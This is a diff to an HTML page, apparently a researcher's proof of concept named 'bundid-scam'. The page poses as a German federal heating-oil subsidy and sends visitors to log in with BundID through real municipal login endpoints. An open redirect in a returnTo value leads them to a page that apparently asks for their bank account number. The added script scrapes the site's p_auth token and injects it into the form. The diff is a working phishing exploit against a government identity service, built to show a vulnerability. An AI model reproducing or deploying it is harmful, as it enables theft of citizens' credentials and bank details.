@@ -36,16 +36,16 @@
 
   <div class="main-container">
   <section class="main">
-    <h1>Die Heizölförderung des Bundes</h1>
+    <h1>Die Heizölförderung für die Stadt Georgsmarienhütte</h1>
   <p class="content">
     Die Bundesverwaltung fördert die Heizölversorgung von Haushalten mit geringem Einkommen mit bis zu <b>2000&nbsp;€</b>. Die Förderung kann ab sofort beantragt werden und ist nur für kurze Zeit verfügbar! <br /> <br /><b>Prüfen Sie ihren Anspruch und beantragen sie die Förderung noch heute!</b>
    </p>
     <p class="content">
       Für die Beantragung müssen Sie sich mit Ihrer BundID einloggen. Falls Sie noch keine BundID haben, können Sie diese <a href="https://service.bund.de/DE/registrierung/registrierung.html">hier</a> beantragen.
     </p>
-      <form action="https://openrathaus.lingen.de/auth/-/servicekonto-bund/login?p_auth=AZXpq9Fz" method="post">
+      <form action="https://service.georgsmarienhuette.de/auth/-/servicekonto-bund" method="post">
     <input type="hidden" name="_bund_WAR_orcomponentservicekonto_authLevel" value="LOW">
-    <input type="hidden" name="_bund_WAR_orcomponentservicekonto_returnTo" value="https://lilithwittmann.github.io/bundid-scam/kontonummer.html">
+    <input type="hidden" name="_bund_WAR_orcomponentservicekonto_returnTo" value="https://openrathaus.lingen.de/c/document_library/find_file_entry?noSuchEntryRedirect=https%3A%2F%2Flilithwittmann.github.io%2Fbundid-scam%2Fkontonummer.html">
         <button type="submit">Login mit BundID</button>
     </form>
 
@@ -57,6 +57,25 @@
       <a href="https://twitter.com/LilithWittmann">Lilith</a>
     </div>
 
+<script>
+    // fetch token from api https://me146mmwm7.execute-api.eu-central-1.amazonaws.com/dev/v1/token and set it as p_auth value in form the form action url (https://openrathaus.lingen.de/auth/-/servicekonto-bund/login?p_auth={token})
+    /*fetch('https://me146mmwm7.execute-api.eu-central-1.amazonaws.com/dev/v1/token')
+    .then(response => response.json())
+        .then(data => {
+            console.log(data.token);
+            document.querySelector('form').action = `https://service.georgsmarienhuette.de/auth/-/servicekonto-bund/login?p_auth=${data.token}&redirect=https://service.georgsmarienhuette.de/c/document_library/find_file_entry?noSuchEntryRedirect=https%3A%2F%2Flilithwittmann.github.io%2Fbundid-scam`
+
+        });*/
+    /*we can do this simpler*/
+    fetch("https://service.georgsmarienhuette.de/auth/-/servicekonto-bund/login").then(response => response.text())
+    .then(data => {
+      console.log(data);
+      // login?p_auth=Y0kBDPyb"> <- match this
+      const token = data.match(/login\?p_auth=([^"]+)/)[1];
+        document.querySelector('form').action = `https://service.georgsmarienhuette.de/auth/-/servicekonto-bund/login?p_auth=${token}&redirect=https://service.georgsmarienhuette.de/c/document_library/find_file_entry?noSuchEntryRedirect=https%3A%2F%2Flilithwittmann.github.io%2Fbundid-scam%2Fkontonummer.html`
+      console.log(token);
+    });
+</script>
 
 </body>
 </html>
